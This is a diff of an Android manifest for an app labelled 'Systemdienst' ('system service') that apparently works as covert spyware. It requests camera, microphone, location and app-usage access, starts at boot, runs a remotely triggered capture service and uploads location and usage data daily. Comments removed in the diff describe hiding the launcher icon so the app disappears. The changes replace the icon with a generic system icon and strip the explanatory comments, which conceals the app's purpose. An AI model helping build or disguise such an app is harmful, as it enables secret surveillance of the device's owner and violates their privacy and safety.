@@ -6,8 +6,12 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- Kamera / Mikro -->
+    <!-- Kamera -->
     <uses-permission android:name="android.permission.CAMERA" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+
+    <!-- Mikro -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
     <!-- Standort -->
@@ -24,30 +28,23 @@
     <!-- Auto-Start nach Neustart -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- App-Nutzungsstatistiken (muss manuell in Einstellungen erlaubt werden) -->
+    <!-- App-Nutzungsstatistiken -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
     <application
         android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
+        android:icon="@android:drawable/ic_menu_compass"
         android:label="Systemdienst"
-        android:theme="@style/Theme.AppCompat">
+        android:theme="@style/Theme.AppCompat"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        tools:ignore="GoogleAppIndexingWarning">
 
-        <!--
-            MainActivity läuft nur einmalig beim Setup (Permissions + FCM-Token).
-            Danach wird die Launcher-Activity per PackageManager deaktiviert
-            → App verschwindet aus der App-Schublade.
-            Der alias "LauncherAlias" ist das eigentliche Launcher-Icon;
-            MainActivity selbst hat keinen Launcher-IntentFilter.
-        -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
-        <!-- Separater Alias für das Launcher-Icon, damit er gezielt
-             deaktiviert werden kann, ohne die Activity zu killen -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -59,7 +56,6 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- Startet den FCM-Token-Refresh nach Geräteneustart -->
         <receiver
             android:name=".receiver.BootReceiver"
             android:exported="true"
@@ -70,7 +66,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- FCM -->
         <service
             android:name=".service.FcmTriggerService"
             android:exported="false">
@@ -79,13 +74,11 @@
             </intent-filter>
         </service>
 
-        <!-- Capture-Service -->
         <service
             android:name=".service.CaptureForegroundService"
             android:exported="false"
             android:foregroundServiceType="camera|microphone|location" />
 
-        <!-- WorkManager: täglicher Upload von Standort + App-Nutzung -->
         <provider
             android:name="androidx.startup.InitializationProvider"
             android:authorities="${applicationId}.androidx-startup"
